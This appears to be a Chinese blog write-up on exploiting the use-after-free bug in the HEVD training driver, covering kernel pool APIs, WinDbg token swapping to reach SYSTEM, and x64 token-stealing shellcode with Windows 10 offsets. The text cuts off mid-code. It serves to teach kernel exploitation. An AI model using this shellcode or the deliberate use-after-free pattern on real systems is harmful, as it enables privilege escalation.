<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 6.3.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"ha0-y.github.io","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":18,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":"mac"},"back2top":{"enable":true,"sidebar":true,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
  </script>

  <meta name="description" content="Windows Kernel NonPagedPool UAF">
<meta property="og:type" content="article">
<meta property="og:title" content="HEVD UAF">
<meta property="og:url" content="https://ha0-y.github.io/2024/02/07/HEVD%20UAF/index.html">
<meta property="og:site_name" content="ham5ter">
<meta property="og:description" content="Windows Kernel NonPagedPool UAF">
<meta property="og:locale" content="zh_CN">
<meta property="article:published_time" content="2024-02-06T16:00:00.000Z">
<meta property="article:modified_time" content="2024-02-19T11:15:14.450Z">
<meta property="article:author" content="ham5ter">
<meta property="article:tag" content="HEVD">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="https://ha0-y.github.io/2024/02/07/HEVD%20UAF/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : false,
    isPost : true,
    lang   : 'zh-CN'
  };
</script>

  <title>HEVD UAF | ham5ter</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">ham5ter</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
      <p class="site-subtitle" itemprop="description">I'm possible</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>

  </li>
        <li class="menu-item menu-item-about">

    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>

  </li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup">
        <div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocapitalize="off"
           placeholder="搜索..." spellcheck="false"
           type="search" class="search-input">
  </div>
  <span class="popup-btn-close">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div id="search-result">
  <div id="no-result">
    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
  </div>
</div>

    </div>
  </div>

</div>
    </header>

    
  <div class="reading-progress-bar"></div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content post posts-expand">
            

    
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://ha0-y.github.io/2024/02/07/HEVD%20UAF/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="ham5ter">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="ham5ter">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          HEVD UAF
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2024-02-07 00:00:00" itemprop="dateCreated datePublished" datetime="2024-02-07T00:00:00+08:00">2024-02-07</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categorievariants/HEVD/" itemprop="url" rel="index"><span itemprop="name">HEVD</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>21k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>39 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
        <blockquote>
<p>Windows Kernel NonPagedPool UAF</p>
</blockquote>
<span id="more"></span>

<h2 id="编译项目"><a href="#编译项目" class="headerlink" title="编译项目"></a>编译项目</h2><p>运行<code>Builder/Build_HEVD_Vulnerable_x64.bat</code></p>
<p>或者VS打开项目，编译。</p>
<ul>
<li>属性-&gt;DriverSetting 先设置为win7&#x2F;win10，生成x64</li>
</ul>
<h2 id="Windows-API"><a href="#Windows-API" class="headerlink" title="Windows API"></a>Windows API</h2><p><code>#pragma alloc_text(PAGE, UseUaFObjectNonPagedPool)</code> 是一个用于在Windows内核开发中指定函数所属代码段属性的编译指令。</p>
<ul>
<li><code>#pragma alloc_text</code> 是一个预处理指令，用于在编译时将函数指定到特定的代码段。</li>
<li><code>PAGE</code> 是<code>#pragma alloc_text</code> 指令后面的参数，用于指定函数所属的代码段。<code>PAGE</code> 表示该函数应该被编译为适用于页码页面的代码段。</li>
</ul>
<p>ExAllocatePoolWithTag: 分配指定类型的池内存，并返回指向已分配块的指针</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://learn.microsoft.com/zh-cn/windows-hardware/drivers/ddi/wdm/ne-wdm-_pool_type">POOL_TYPE (wdm.h)</a></li>
</ul>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">PVOID <span class="title">ExAllocatePoolWithTag</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  [in] __drv_strictTypeMatch(__drv_typeExpr)POOL_TYPE PoolType,         <span class="comment">// 要分配的池内存的类型，POOL_TYPE 枚举</span></span></span></span><br><span class="line"><span class="params"><span class="function">  [in] SIZE_T                                         NumberOfBytes,    <span class="comment">// 要分配的字节数</span></span></span></span><br><span class="line"><span class="params"><span class="function">  [in] ULONG                                          Tag               <span class="comment">// 要用于已分配内存的池标记，字符串通常按反向顺序指定</span></span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>; </span><br></pre></td></tr></table></figure>

<p>windows 内存管理器创建系统用于分配内存的以下内存池：非分页池和分页池。 这两个内存池都位于为系统保留并映射到每个进程的虚拟地址空间的地址空间区域中。内核池类似于Windows 中的堆, 因为它的作用也是用来动态分配内存</p>
<ul>
<li>非分页池由虚拟内存地址组成，只要分配了相应的内核对象，这些地址就保证驻留在物理内存中。 </li>
<li>分页池由虚拟内存组成，可以分页进出系统。</li>
<li><strong>PagedPool</strong>简单来说就是物理内存不够时，会把这片内存移动到硬盘上，而<strong>NonPagedPool</strong>是无论物理内存如何紧缺，都绝对不把这片内存的内容移动到硬盘上。</li>
</ul>
<p>ExFreePoolWithTag: 释放池内存</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">ExFreePoolWithTag</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  [in] PVOID P,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in] ULONG Tag</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure>

<p>NtAllocateReserveObject：ntdll中系统调用。负责在内核端创建保留对象–在内核池上执行内存分配，返回Handle</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">NTSTATUS STDCALL <span class="title">NtAllocateReserveObject</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    OUT PHANDLE hObject,</span></span></span><br><span class="line"><span class="params"><span class="function">    IN POBJECT_ATTRIBUTES ObjectAttributes,</span></span></span><br><span class="line"><span class="params"><span class="function">    IN DWORD ObjectType </span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span></span><br></pre></td></tr></table></figure>

<h2 id="驱动层权限提升"><a href="#驱动层权限提升" class="headerlink" title="驱动层权限提升"></a>驱动层权限提升</h2><p>内核数据结构包含了一个指向token的指针。当进程试图去执行各种操作时，比如打开一个文件，token中的账户权限会用于和所需的权限进行比较，以此决定该操作是否可行。</p>
<p>Windows提权：获取 <code>nt authority\system</code>权限</p>
<ul>
<li>将SYSTEM进程的token复制到当前进程，这样当前进程则为system权限<a target="_blank" rel="noopener" href="https://bbs.kanxue.com/thread-224058-1.htm">(1)</a>。</li>
<li>编辑ACL&#x2F;ACE 或者 直接修改token中的<code>dt _token : +0x040 Privileges: _SEP_TOKEN_PRIVILEGES</code>以达到权限提升的目的，此方法有一个好处是被修改进程的用户名等信息不会改变，只是权限改变了<a target="_blank" rel="noopener" href="https://wonderkun.cc/2021/08/22/windows10%E5%86%85%E6%A0%B8%E6%80%81%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E6%B1%87%E6%80%BB/">(2)</a></li>
</ul>
<h3 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h3><p>win10 22h2</p>
<p>首先找到System进程的16进制地址</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">0: kd&gt; !dml_proc</span><br><span class="line">Address           PID  Image file name</span><br><span class="line">ffff940f`cfea7080 4    System</span><br><span class="line">...</span><br><span class="line">ffff940f`d7240080 2270 cmd.exe</span><br><span class="line"></span><br><span class="line">0: kd&gt; !process 0 0 system</span><br><span class="line">PROCESS ffff940fcfea7080</span><br><span class="line">    SessionId: none  Cid: 0004    Peb: 00000000  ParentCid: 0000</span><br><span class="line">    DirBase: 001ad000  ObjectTable: ffffe78dfac04800  HandleCount: 3023.</span><br><span class="line">    Image: System</span><br></pre></td></tr></table></figure>

<p>它指向一个<code>_EPROCESS</code>结构，查看，一个比较大的结构体</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">0: kd&gt; dt _EPROCESS ffff940f`cfea7080</span><br><span class="line">ntdll!_EPROCESS</span><br><span class="line">   +0x000 Pcb              : _KPROCESS</span><br><span class="line">   +0x438 ProcessLock      : _EX_PUSH_LOCK</span><br><span class="line">   +0x440 UniqueProcessId  : 0x00000000`00000004 Void</span><br><span class="line">   +0x448 ActiveProcessLinks : _LIST_ENTRY [ 0xffff940f`cff084c8 - 0xfffff803`7181e130 ]</span><br><span class="line">   +0x458 RundownProtect   : _EX_RUNDOWN_REF</span><br><span class="line">   ...</span><br><span class="line">   +0x4b8 Token            : _EX_FAST_REF</span><br><span class="line">   ...</span><br></pre></td></tr></table></figure>

<p>可以看到token偏移（根据系统进行变化，并且token字段是以<code>_EX_FAST_REF</code>来声明的而不是<code>_TOKEN</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">0: kd&gt; dq ffffe78dfac04800+4b8 L1</span><br><span class="line">ffffe78d`fac04cb8  ffffe78d`fac0c05e</span><br><span class="line"></span><br><span class="line">0: kd&gt; dt _EX_FAST_REF ffffe78dfac04800+4b8</span><br><span class="line">ntdll!_EX_FAST_REF</span><br><span class="line">   +0x000 Object           : 0xffffe78d`fac0c05e Void</span><br><span class="line">   +0x000 RefCnt           : 0y1110</span><br><span class="line">   +0x000 Value            : 0xffffe78d`fac0c05e</span><br></pre></td></tr></table></figure>

<p>蓝屏警告：这个 <code>token</code> 后四位全为0才是token</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0: kd&gt; !token ffffe78d`fac0c050</span><br></pre></td></tr></table></figure>

<p>定位cmd.exe进程的<code>_EPROCESS</code>结构并替换偏移0x208的token指针值为System的token地址</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">0: kd&gt; !process 0 0 cmd.exe</span><br><span class="line">PROCESS ffff940fd7240080</span><br><span class="line">    SessionId: 1  Cid: 2270    Peb: f4e7043000  ParentCid: 13bc</span><br><span class="line">    DirBase: 172720000  ObjectTable: ffffe78e02a18080  HandleCount:  75.</span><br><span class="line">    Image: cmd.exe</span><br><span class="line"></span><br><span class="line">0: kd&gt; dt _EX_FAST_REF +0x4b8+ffff940fd7240080</span><br><span class="line">ntdll!_EX_FAST_REF</span><br><span class="line">   +0x000 Object           : 0xffffe78e`02dcb06b Void</span><br><span class="line">   +0x000 RefCnt           : 0y1011</span><br><span class="line">   +0x000 Value            : 0xffffe78e`02dcb06b</span><br><span class="line"></span><br><span class="line">0: kd&gt; eq 0x4b8+ffff940fd7240080 0xffffe78d`fac0c050</span><br><span class="line">0: kd&gt; dt _EX_FAST_REF +0x4b8+ffff940fd7240080</span><br><span class="line">ntdll!_EX_FAST_REF</span><br><span class="line">   +0x000 Object           : 0xffffe78d`fac0c05e Void</span><br><span class="line">   +0x000 RefCnt           : 0y1110</span><br><span class="line">   +0x000 Value            : 0xffffe78d`fac0c05e</span><br><span class="line">0: kd&gt; g</span><br></pre></td></tr></table></figure>

<p>替换成功</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\<span class="title">Users</span>\<span class="title">debugger</span>&gt;<span class="title">whoami</span></span></span><br><span class="line"><span class="function"><span class="title">desktop</span>-8<span class="title">h64pu1</span>\<span class="title">debugger</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">C</span>:\<span class="title">Users</span>\<span class="title">debugger</span>&gt;<span class="title">whoami</span></span></span><br><span class="line"><span class="function"><span class="title">nt</span> <span class="title">authority</span>\<span class="title">system</span></span></span><br></pre></td></tr></table></figure>

<h3 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h3><p>寻找 <code>_KTHREAD</code> 结构：反汇编 <code>PsGetCurrentThread</code> 函数</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">0: kd&gt; uf PsGetCurrentProcess </span><br><span class="line">nt!PsGetCurrentProcess:</span><br><span class="line">fffff801`3f68eea0 65488b042588010000 mov   rax,qword ptr gs:[188h]</span><br><span class="line">fffff801`3f68eea9 488b80b8000000  mov     rax,qword ptr [rax+0B8h]</span><br><span class="line">fffff801`3f68eeb0 c3              ret</span><br></pre></td></tr></table></figure>

<p>其实<code>gs:[188h]</code>的位置存贮的是 <code>_KTHREAD</code> 结构的地址，看一下这个结构，发现0x220的位置存储的就是 <code>_KPROCESS</code>，但是这里是取得 <code>0xb8</code>, 0x98其实存储的结构是<code>_KAPC_STATE</code>，<code>0x20</code>位置存储的就是<code>_KPROCESS</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">0: kd&gt; dt _KTHREAD</span><br><span class="line">   ...</span><br><span class="line">   +0x098 ApcStateFill     : [43] UChar</span><br><span class="line">   +0x0c3 Priority         : Char</span><br><span class="line">   ...</span><br><span class="line"></span><br><span class="line">0: kd&gt; dt _KAPC_STATE</span><br><span class="line">ntdll!_KAPC_STATE</span><br><span class="line">   +0x000 ApcListHead      : [2] _LIST_ENTRY</span><br><span class="line">   +0x020 Process          : Ptr64 _KPROCESS</span><br><span class="line">   +0x028 InProgressFlags  : UChar</span><br><span class="line">   +0x028 KernelApcInProgress : Pos 0, 1 Bit</span><br><span class="line">   +0x028 SpecialApcInProgress : Pos 1, 1 Bit</span><br><span class="line">   +0x029 KernelApcPending : UChar</span><br><span class="line">   +0x02a UserApcPendingAll : UChar</span><br><span class="line">   +0x02a SpecialUserApcPending : Pos 0, 1 Bit</span><br><span class="line">   +0x02a UserApcPending   : Pos 1, 1 Bit</span><br></pre></td></tr></table></figure>

<p>因此在r3寻找到 <code>_KPROCESS </code>的实现</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mov r9, qword ptr gs:[<span class="number">0x188</span>]  </span><br><span class="line">mov r9, qword ptr[r9+<span class="number">0x0B8</span>]</span><br><span class="line"><span class="comment">// 或者</span></span><br><span class="line">mov r9, qword ptr gs:[<span class="number">0x188</span>]  </span><br><span class="line">mov r9, qword ptr[r9+<span class="number">0x220</span>]</span><br></pre></td></tr></table></figure>

<p><code>_EPROCESS</code>是包含了<code>_KPROCESS</code>的结构体，他们的起始地址是一样的，我们可以通过dt来查看</p>
<ul>
<li>内核用来跟踪进程的结构是KPROCESS。 执行子系统用来跟踪它的结构是EPROCESS。 作为一个实现细节，KPROCESS是EPROCESS的第一个字段，所以执行子系统分配EPROCESS结构，然后调用coreel来初始化它的KPROCESS部分。最后，这两个结构都是表示用户进程实例的Process Object的一部分。</li>
<li>在<a target="_blank" rel="noopener" href="https://stackoverflow.com/questions/5790587/what-is-the-difference-between-eprocess-object-and-kprocess-object">Stack Overflow</a>寻找答案</li>
</ul>
<p>第一个元素就是 <code>_KPROCESS</code>, <code>UniqueProcessId</code> 存储的是当前进程的pid，<code>InheritedFromUniqueProcessId</code>存储的是父进程的pid</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">0: kd&gt; dt _EPROCESS</span><br><span class="line">ntdll!_EPROCESS</span><br><span class="line">   +0x000 Pcb              : _KPROCESS</span><br><span class="line">   +0x438 ProcessLock      : _EX_PUSH_LOCK</span><br><span class="line">   +0x440 UniqueProcessId  : Ptr64 Void</span><br><span class="line">   +0x448 ActiveProcessLinks : _LIST_ENTRY</span><br><span class="line">   ...</span><br><span class="line">   +0x540 InheritedFromUniqueProcessId : Ptr64 Void</span><br><span class="line">   +0x548 OwnerProcessId   : Uint8B</span><br><span class="line">   ...</span><br></pre></td></tr></table></figure>

<p>因为程序大多数在cmd.exe启动，因此我们获得的是 cmd 的 <code>_KPROCESS</code>，我们需要替换的是这个，我们需要寻找到system进程token</p>
<p>链表元素就是 <code>ActiveProcessLinks</code>，接下来遍历这个链表就可以找到system(pid&#x3D;4)的<code>_KPROCESS</code>。参考<a target="_blank" rel="noopener" href="https://bbs.kanxue.com/thread-224058-1.htm">这里</a>，修改偏移为当前系统的</p>
<ul>
<li>EPROCESS 在 KTHREAD + 0xb8</li>
<li>ActiveProcessLinks 在 EPROCESS + 0x448</li>
<li>ActiveProcessLinks 距离 Token 距离</li>
<li>token 在 EPROCESS + 0x4b8 处</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">    mov rdx, [gs:<span class="number">188</span>h]       ;get _ETHREAD pointer from KPCR</span><br><span class="line">    mov r8, [rdx+<span class="number">0xb8</span>]       ;_EPROCESS (see PsGetCurrentProcess function)</span><br><span class="line">    mov r9, [r8+<span class="number">0x448</span>]       ;ActiveProcessLinks list head</span><br><span class="line">    mov rcx, [r9]            ;follow link to first process in list</span><br><span class="line">find_system_proc:</span><br><span class="line">    mov rdx, [rcx<span class="number">-8</span>]         ;offset from ActiveProcessLinks to UniqueProcessId</span><br><span class="line">    cmp rdx, <span class="number">4</span>               ;process with ID <span class="number">4</span> is System process</span><br><span class="line">    jz found_it</span><br><span class="line">    mov rcx, [rcx]           ;follow _LIST_ENTRY Flink pointer</span><br><span class="line">    cmp rcx, r9              ;see <span class="keyword">if</span> back at list head</span><br><span class="line">    jnz find_system_proc</span><br><span class="line">found_it:</span><br><span class="line">    mov rax, [rcx+<span class="number">0x80</span>]      ;offset from ActiveProcessLinks to Token</span><br><span class="line">    <span class="keyword">and</span> al, <span class="number">0xf0</span>             ;clear low <span class="number">4</span> bits of _EX_FAST_REF structure</span><br><span class="line">    mov [r8+<span class="number">0x4b8</span>], rax      ;replace current process token with system token</span><br><span class="line">    ret</span><br></pre></td></tr></table></figure>

<h2 id="寻找合适的对象"><a href="#寻找合适的对象" class="headerlink" title="寻找合适的对象"></a>寻找合适的对象</h2><p>池喷射需要找到适合大小的内核对象以及池对象，使用windbg分析</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">!object \ObjectTypes</span><br><span class="line"></span><br><span class="line">dt nt!_OBJECT_TYPE &lt;addr&gt;</span><br><span class="line">dt nt!_OBJECT_TYPE_INITIALIZER &lt;addr&gt;</span><br></pre></td></tr></table></figure>

<h2 id="审计"><a href="#审计" class="headerlink" title="审计"></a>审计</h2><p>在存在漏洞的驱动里，对象free后没有置为NULL</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">NTSTATUS</span></span><br><span class="line"><span class="function"><span class="title">FreeUaFObjectNonPagedPool</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    VOID</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    NTSTATUS Status = STATUS_UNSUCCESSFUL;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">PAGED_CODE</span>();</span><br><span class="line"></span><br><span class="line">    __try</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (g_UseAfterFreeObjectNonPagedPool)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">DbgPrint</span>(<span class="string">&quot;[+] Freeing UaF Object\n&quot;</span>);</span><br><span class="line">            <span class="built_in">DbgPrint</span>(<span class="string">&quot;[+] Pool Tag: %s\n&quot;</span>, <span class="built_in">STRINGIFY</span>(POOL_TAG));</span><br><span class="line">            <span class="built_in">DbgPrint</span>(<span class="string">&quot;[+] Pool Chunk: 0x%p\n&quot;</span>, g_UseAfterFreeObjectNonPagedPool);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> SECURE</span></span><br><span class="line">            <span class="comment">//</span></span><br><span class="line">            <span class="comment">// Secure Note: This is secure because the developer is setting</span></span><br><span class="line">            <span class="comment">// &#x27;g_UseAfterFreeObjectNonPagedPool&#x27; to NULL once the Pool chunk is being freed</span></span><br><span class="line">            <span class="comment">//</span></span><br><span class="line"></span><br><span class="line">            <span class="built_in">ExFreePoolWithTag</span>((PVOID)g_UseAfterFreeObjectNonPagedPool, (ULONG)POOL_TAG);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//</span></span><br><span class="line">            <span class="comment">// Set to NULL to avoid dangling pointer</span></span><br><span class="line">            <span class="comment">//</span></span><br><span class="line"></span><br><span class="line">            g_UseAfterFreeObjectNonPagedPool = <span class="literal">NULL</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">            <span class="comment">//</span></span><br><span class="line">            <span class="comment">// Vulnerability Note: This is a vanilla Use After Free vulnerability</span></span><br><span class="line">            <span class="comment">// because the developer is not setting &#x27;g_UseAfterFreeObjectNonPagedPool&#x27; to NULL.</span></span><br><span class="line">            <span class="comment">// Hence, g_UseAfterFreeObjectNonPagedPool still holds the reference to stale pointer</span></span><br><span class="line">            <span class="comment">// (dangling pointer)</span></span><br><span class="line">            <span class="comment">//</span></span><br><span class="line"></span><br><span class="line">            <span class="built_in">ExFreePoolWithTag</span>((PVOID)g_UseAfterFreeObjectNonPagedPool, (ULONG)POOL_TAG);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">            Status = STATUS_SUCCESS;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    __except 